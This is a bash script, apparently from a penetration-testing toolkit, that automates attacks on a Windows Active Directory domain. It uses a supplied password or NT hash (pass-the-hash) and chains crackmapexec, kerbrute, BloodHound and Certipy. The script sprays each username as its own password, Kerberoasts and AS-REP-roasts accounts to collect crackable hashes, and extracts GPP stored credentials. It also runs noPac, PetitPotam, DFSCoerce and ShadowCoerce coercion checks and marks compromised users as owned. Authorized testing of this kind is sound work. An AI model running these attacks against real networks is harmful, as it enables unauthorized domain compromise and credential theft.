#!/bin/bash

figlet UserChecks

echo "CME is still buggy u need to press ENTER sometimes!"
unset USER HASH PASS DOM IP FQDN BHDOM

read -r -p "Username: " USER
echo "do NOT provide Password AND Hash, Script intelligence is missing."
echo "leave Password EMPTY for Hash usage!"
read -r -p "Password: " PASS
echo "leave Hash EMPTY if Password is set!"
read -r -p "NT Hash: " HASH
read -r -p "Domain: " DOM
read -r -p "IP DomainController: " IP

#Check for valide IP
if [[ $IP =~ ^[0-9]+(\.[0-9]+){3}$ ]]; then
  echo "DC IP is: ""$IP"
else
  echo "Wrong IP Format"
  exit 1
fi

# get DC_FQDN
FQDN=$(nslookup "$IP" "$IP" | awk '/name/ {print$4}' | sed 's/.$//')
# Domain all uppercase for BH query
BHDOM=$(echo "$DOM" | tr '[:lower:]' '[:upper:]')

# Python unbuffered for output
export PYTHONUNBUFFERED=TRUE

# unauthenticated
echo "CME user unauthenticated" >>/root/output/runtime.txt
date >>/root/output/runtime.txt
# CME User unauthenticated
echo "CME user unauthenticated"
crackmapexec smb "$IP" --users >>/root/output/loot/intern/smb/anonymous_enumeration/"$IP"_unauthenticated.txt 2>&1

echo "CME PetitPotam unauthenticated" >>/root/output/runtime.txt
date >>/root/output/runtime.txt
# CME User unauthenticated
echo "CME PetitPotam unauthenticated"
crackmapexec smb "$IP" -M petitpotam >>/root/output/loot/intern/rpc/petit_potam/"$IP"_unauthenticated.txt 2>&1

if [ -z "$HASH" ]; then
  # Use Password
  echo "CME GPP_Password" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # GPP password
  echo "CME GPP_Password"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M gpp_password >>/root/output/loot/intern/ad/gpp_password/pass_"$DOM".txt 2>&1

  echo "CME GPP_Autologin" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # GPP autologin
  echo "CME GPP_Autologin"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M gpp_autologin >>/root/output/loot/intern/ad/gpp_autologin/login_"$DOM".txt 2>&1

  echo "CME username_as_pass" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # User txt from DC
  echo "CME username_as_pass"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" --users >/root/output/list/raw.txt 2>&1
  # shellcheck disable=SC1003
  awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | grep -v 'HealthMailbox' | sed '/\x1b\[[0-9;]*[mGKHF]/d' >/root/output/list/user.txt
  rm /root/output/list/raw.txt
  crackmapexec smb "$IP" -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >>/root/output/loot/intern/ad/iam/user_as_pass/raw_"$DOM".txt 2>&1

  echo "kerbrute userenum" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # Kerbrute
  echo "kerbrute userenum"
  kerbrute userenum /root/output/list/user.txt -d "$DOM" >>/root/output/loot/intern/ad/kerberos/user_enum/kerbrute_"$DOM".txt 2>&1

  echo "CME Shares" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  echo "CME Shares"
  crackmapexec smb /root/output/list/smb_open.txt -u "$USER" -p "$PASS" -d "$DOM" --shares >/root/output/loot/intern/smb/cme_auth_raw_shares.txt 2>&1

  echo "CME Pass-Pol" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # Password policy
  echo "CME Pass-Pol"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" --pass-pol >>/root/output/loot/intern/ad/iam/passpol/pol_"$DOM".txt 2>&1

  echo "CME nopac" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # nopac
  echo "CME nopac"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M nopac >>/root/output/loot/intern/ldap/nopac/nopac_"$FQDN".txt 2>&1

  echo "CME Petit Potam" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # petitpotam
  echo "CME Petit Potam"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M petitpotam >>/root/output/loot/intern/rpc/petit_potam/petitpotam_"$FQDN".txt 2>&1

  echo "CME DFScoerce" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # DFScoerce
  echo "CME DFScoerce"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M dfscoerce >>/root/output/loot/intern/rpc/dfscoerce/dfscoerce_"$FQDN".txt 2>&1

  echo "CME Shadowcoerce" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # Shadowcoerce
  echo "CME Shadowcoerce"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M shadowcoerce >>/root/output/loot/intern/rpc/shadowcoerce/shadowcoerce_"$FQDN".txt 2>&1

  echo "CME Sessions" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # sessions
  echo "CME Sessions"
  crackmapexec smb /root/output/list/smb_open.txt -u "$USER" -p "$PASS" -d "$DOM" --sessions >>/root/output/loot/intern/ad/session/sessions_"$DOM".txt 2>&1

  echo "CME ntlmv1 check" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # cme ntlmv1 check
  echo "CME ntlmv1 check"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M ntlmv1 >>/root/output/loot/intern/ad/iam/ntlm_auth/ntlmv1_"$DOM".txt 2>&1

  echo "CME ASRep" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # asreproast
  echo "CME ASRep"
  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_"$DOM".txt >>/root/output/loot/intern/ad/kerberos/asreproast/raw_"$DOM".txt 2>&1

  echo "CME Kerberoast" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # kerberoast
  echo "CME Kerberoast"
  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_"$DOM".txt >>/root/output/loot/intern/ad/kerberos/kerberoasting/raw_"$DOM".txt 2>&1

  echo "CME MAQ" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # MAQ
  echo "CME MAQ"
  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" -M MAQ >>/root/output/loot/intern/ad/quota/maq_"$DOM".txt 2>&1

  echo "CME MAQ PWSH" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # MAQ
  echo "CME MAQ PWSH"
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -X 'Get-ADObject ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota' >>/root/output/loot/intern/ad/quota/pwsh_maq_"$DOM".txt 2>&1

  echo "MAQ python" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # MAQ
  echo "MAQ python"
  python3 /opt/auto_pt/resources/maq.py "$DOM"/"$USER":"$PASS" -dc-ip "$IP" >>/root/output/loot/intern/ad/quota/pymaq_"$DOM".txt 2>&1
  echo "MAQ python ldaps"
  python3 /opt/auto_pt/resources/maq.py "$DOM"/"$USER":"$PASS" -dc-ip "$IP" -use-ldaps >>/root/output/loot/intern/ad/quota/pymaq_"$DOM".txt 2>&1

  echo "CME LDAP Checker" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # CME Ldap signing
  echo "CME LDAP Checker"
  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" -M ldap-checker >>/root/output/loot/intern/ldap/ldap_check_"$DOM".txt 2>&1

  echo "CME LDAP Signing" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # CME Ldap signing
  echo "CME LDAP Signing"
  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" -M ldap-signing >>/root/output/loot/intern/ldap/ldap_sign_"$DOM".txt 2>&1

  echo "LdapRelayScan LDAP Signing" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # ldap signing
  echo "LdapRelayScan LDAP Signing"
  python3 /opt/LdapRelayScan/LdapRelayScan.py -u "$USER" -p "$PASS" -dc-ip "$IP" -method BOTH >>/root/output/loot/intern/ldap/signig_"$DOM".txt 2>&1

  echo "Bloodhound" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # bloodhound
  echo "Bloodhound"
  bloodhound-python -u "$USER" -p "$PASS" -d "$DOM" -dc "$FQDN" -w 50 -c all --zip

  echo "Certipy OLD" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # certipy
  echo "Certipy OLD"
  certipy find -u "$USER" -p "$PASS" -target "$IP" -old-bloodhound
fi

if [ -z "$PASS" ]; then
  # use HASH

  #check for valide NTHASH
  if [ ${#HASH} != 32 ]; then
    echo "Wrong hash Format, just NT HASH"
    exit 1
  else
    echo "Hash looks valide"
  fi

  echo "CME GPP_Password" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # GPP password
  echo "CME GPP_Password"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M gpp_password >>/root/output/loot/intern/ad/gpp_password/pass_"$DOM".txt 2>&1

  echo "CME GPP_Autologin" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # GPP autologin
  echo "CME GPP_Autologin"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M gpp_autologin >>/root/output/loot/intern/ad/gpp_autologin/login_"$DOM".txt 2>&1

  echo "CME username_as_pass" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # User txt from DC
  echo "CME username_as_pass"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" --users >/root/output/list/raw.txt 2>&1
  # shellcheck disable=SC1003
  awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | grep -v 'HealthMailbox' | sed '/\x1b\[[0-9;]*[mGKHF]/d' >/root/output/list/user.txt
  rm /root/output/list/raw.txt
  crackmapexec smb "$IP" -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >>/root/output/loot/intern/ad/iam/user_as_pass/raw_"$DOM".txt 2>&1

  echo "kerbrute userenum" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # Kerbrute
  echo "kerbrute userenum"
  kerbrute userenum /root/output/list/user.txt -d "$DOM" >>/root/output/loot/intern/ad/kerberos/user_enum/kerbrute_"$DOM".txt 2>&1

  echo "CME Shares" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  echo "CME Shares"
  crackmapexec smb /root/output/list/smb_open.txt -u "$USER" -H "$HASH" -d "$DOM" --shares >/root/output/loot/intern/smb/cme_auth_raw_shares.txt 2>&1

  echo "CME Pass-Pol" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # Password policy
  echo "CME Pass-Pol"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" --pass-pol >>/root/output/loot/intern/ad/iam/passpol/pol_"$DOM".txt 2>&1

  echo "CME nopac" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # nopac
  echo "CME nopac"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M nopac >>/root/output/loot/intern/ldap/nopac/nopac_"$FQDN".txt 2>&1

  echo "CME Petit Potam" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # petitpotam
  echo "CME Petit Potam"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M petitpotam >>/root/output/loot/intern/rpc/petit_potam/petitpotam_"$FQDN".txt 2>&1

  echo "CME DFScoerce" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # DFScoerce
  echo "CME DFScoerce"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M dfscoerce >>/root/output/loot/intern/rpc/dfscoerce/dfscoerce_"$FQDN".txt 2>&1

  echo "CME Shadowcoerce" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # Shadowcoerce
  echo "CME Shadowcoerce"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M shadowcoerce >>/root/output/loot/intern/rpc/shadowcoerce/shadowcoerce_"$FQDN".txt 2>&1

  echo "CME Sessions" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # sessions
  echo "CME Sessions"
  crackmapexec smb /root/output/list/smb_open.txt -u "$USER" -H "$HASH" -d "$DOM" --sessions >>/root/output/loot/intern/ad/session/sessions_"$FQDN".txt 2>&1

  echo "CME ntlmv1 check" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # CME ntlmv1 check
  echo "CME ntlmv1 check"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M ntlmv1 >>/root/output/loot/intern/ad/iam/ntlm_auth/ntlmv1_"$DOM".txt 2>&1

  echo "CME ASRep" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # asreproast
  echo "CME ASRep"
  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_"$DOM".txt >>/root/output/loot/intern/ad/kerberos/asreproast/raw_"$DOM".txt 2>&1

  echo "CME Kerberoast" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # kerberoast
  echo "CME Kerberoast"
  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_"$DOM".txt >>/root/output/loot/intern/ad/kerberos/kerberoasting/raw_"$DOM".txt 2>&1

  echo "CME MAQ" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # MAQ
  echo "CME MAQ"
  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" -M MAQ >>/root/output/loot/intern/ad/quota/maq_"$DOM".txt 2>&1

  echo "CME MAQ PWSH" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # MAQ
  echo "CME MAQ PWSH"
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -X 'Get-ADObject ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota' >>/root/output/loot/intern/ad/quota/pwsh_maq_"$DOM".txt 2>&1

  echo "MAQ python" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # MAQ
  echo "MAQ python"
  python3 /opt/auto_pt/resources/maq.py "$DOM"/"$USER" -hashes aad3b435b51404eeaad3b435b51404ee:"$HASH" -dc-ip "$IP" >>/root/output/loot/intern/ad/quota/pymaq_"$DOM".txt 2>&1
  echo "MAQ python ldaps"
  python3 /opt/auto_pt/resources/maq.py "$DOM"/"$USER" -hashes aad3b435b51404eeaad3b435b51404ee:"$HASH" -dc-ip "$IP" -use-ldaps >>/root/output/loot/intern/ad/quota/pymaq_"$DOM".txt 2>&1

  echo "CME LDAP Checker" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # CME Ldap signing
  echo "CME LDAP Checker"
  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" -M ldap-checker >>/root/output/loot/intern/ldap/ldap_check_"$DOM".txt 2>&1

  echo "CME LDAP Signing" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # CME Ldap signing
  echo "CME LDAP Signing"
  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" -M ldap-signing >>/root/output/loot/intern/ldap/ldap_sign_"$DOM".txt 2>&1

  echo "LdapRelayScan LDAP Signing" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # ldap signing
  echo "LdapRelayScan LDAP Signing"
  python3 /opt/LdapRelayScan/LdapRelayScan.py -u "$USER" -nthash "$HASH" -dc-ip "$IP" -method BOTH >>/root/output/loot/intern/ldap/signig_"$DOM".txt 2>&1

  echo "Bloodhound" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # bloodhound
  echo "Bloodhound"
  bloodhound-python -u "$USER" --hashes aad3b435b51404eeaad3b435b51404ee:"$HASH" -d "$DOM" -dc "$FQDN" -w 50 -c all --zip

  echo "Certipy OLD" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # Certipy
  echo "Certipy OLD"
  certipy find -u "$USER" -hashes "$HASH" -target "$IP" -old-bloodhound
fi

# Looting
echo "looting" >>/root/output/runtime.txt
date >>/root/output/runtime.txt
echo "Looting"
#BH and Certipy to intern AD
mv ./*.zip /root/output/loot/intern/ad

# Kerbrute
awk '/VALID USERNAME/ {print$7}' /root/output/loot/intern/ad/kerberos/user_enum/kerbrute_"$DOM".txt | sed 's/@.*//g' >/root/output/list/user_kerbrute_"$DOM".txt

# BH owned
grep '+' /root/output/loot/intern/ad/iam/user_as_pass/raw_"$DOM".txt >/root/output/loot/intern/ad/iam/user_as_pass/user_"$DOM".txt
# keep the raw file for screens and debugging
# BH owned User
awk '/\+/ {print$6}' /root/output/loot/intern/ad/iam/user_as_pass/user_"$DOM".txt | cut -d : -f 2 | sort -u | tr '[:lower:]' '[:upper:]' >/root/output/loot/intern/ad/iam/user_as_pass/owneduser.txt

for i in $(cat /root/output/loot/intern/ad/iam/user_as_pass/owneduser.txt); do
  echo "MATCH (n) WHERE n.name = '""$i""@""$BHDOM""' SET n.owned=True SET n.UserNameAsPass=True SET n.plaintext=True;" >>/root/output/loot/intern/ad/iam/user_as_pass/bh_owned.txt
done

# GPP AutoLogin
awk '/Found credentials/ {print$2}' /root/output/loot/intern/ad/gpp_autologin/login_"$DOM".txt | sort -u >/root/output/loot/intern/ad/gpp_autologin/host.txt
if [ -s /root/output/loot/intern/ad/gpp_autologin/host.txt ]; then
  echo "PS-TN-2021-0002 GPP_Autologin" >>/root/output/findings.txt
  awk '/Found credentials in/ {print$2}' /root/output/loot/intern/ad/gpp_autologin/login_"$DOM".txt | sort -u >>/root/output/findings.txt
  echo '' >>/root/output/findings.txt
fi

# GPP Passwords
awk '/Found credentials in/ {print$2}' /root/output/loot/intern/ad/gpp_password/pass_"$DOM".txt | sort -u >/root/output/loot/intern/ad/gpp_password/host.txt
if [ -s /root/output/loot/intern/ad/gpp_password/host.txt ]; then
  echo "PS-TN-2020-0051 GPP_Password" >>/root/output/findings.txt
  awk '/Found credentials in/ {print$2}' /root/output/loot/intern/ad/gpp_password/pass_"$DOM".txt | sort -u >>/root/output/findings.txt
fi

#Shares
grep 'READ' /root/output/loot/intern/smb/cme_auth_raw_shares.txt | grep -v 'IPC\$\|print\$' >/root/output/loot/intern/smb/auth_read_shares.txt
grep 'WRITE' /root/output/loot/intern/smb/cme_auth_raw_shares.txt | grep -v 'IPC\$\|print\$' >/root/output/loot/intern/smb/auth_write_shares.txt

#Local Admin
grep 'Pwn3d' /root/output/loot/intern/smb/cme_auth_raw_shares.txt >/root/output/loot/intern/ad/local_admin/cme_admin_raw.txt
if [ -s /root/output/loot/intern/ad/local_admin/cme_admin_raw.txt ]; then
  figlet 'Local Admin Found'
  figlet 'Local Admin Found' >>/root/output/runtime.txt
fi

#LDAP Signing
grep '+.*SERVER SIGNING' -B 4 /root/output/loot/intern/ldap/signig_"$DOM".txt | grep -v 'Unexpected error\|DeprecationWarning\|Checking DCs for LDAP\|ssl.wrap_socket' >/root/output/loot/intern/ldap/signing/raw_"$DOM".txt
awk '/Signing NOT Enforced/ {print$4}' /root/output/loot/intern/ldap/ldap_check_"$DOM".txt >/root/output/loot/intern/ldap/signing/hosts.txt
if [[ -s /root/output/loot/intern/ldap/signing/hosts.txt || -s /root/output/loot/intern/ldap/signing/raw_"$DOM".txt ]]; then
  echo 'PS-TN-2020-0023 LDAP Signing' >>/root/output/findings.txt
  awk '/Signing NOT Enforced/ {print$4}' /root/output/loot/intern/ldap/ldap_check_"$DOM".txt >>/root/output/findings.txt
fi

#LDAP ChannelBinding
grep '+.*CHANNEL BINDING' -B 4 /root/output/loot/intern/ldap/signig_"$DOM".txt | grep -v 'Unexpected error\|DeprecationWarning\|Checking DCs for LDAP\|ssl.wrap_socket' >/root/output/loot/intern/ldap/channel_binding/raw_"$DOM".txt
awk '/Channel Binding is set to "NEVER"/ {print$4}' /root/output/loot/intern/ldap/ldap_check_"$DOM".txt >/root/output/loot/intern/ldap/channel_binding/hosts.txt
if [[ -s /root/output/loot/intern/ldap/channel_binding/hosts.txt || -s /root/output/loot/intern/ldap/channel_binding/raw_"$DOM".txt ]]; then
  echo 'PS-TN-2023-0000 LDAP Channel Binding' >>/root/output/findings.txt
  awk '/Channel Binding is set to "NEVER"/ {print$4}' /root/output/loot/intern/ldap/channel_binding/ldap_check_"$DOM".txt >>/root/output/findings.txt
  echo '' >>/root/output/findings.txt
  cp /root/output/loot/intern/ldap/signing/signig_"$DOM".txt /root/output/loot/intern/ldap/channel_binding/
fi

echo "Userchecks Done" >>/root/output/runtime.txt
date >>/root/output/runtime.txt

figlet "Userchecks Done"

# Python unbuffered reset to default
unset PYTHONUNBUFFERED
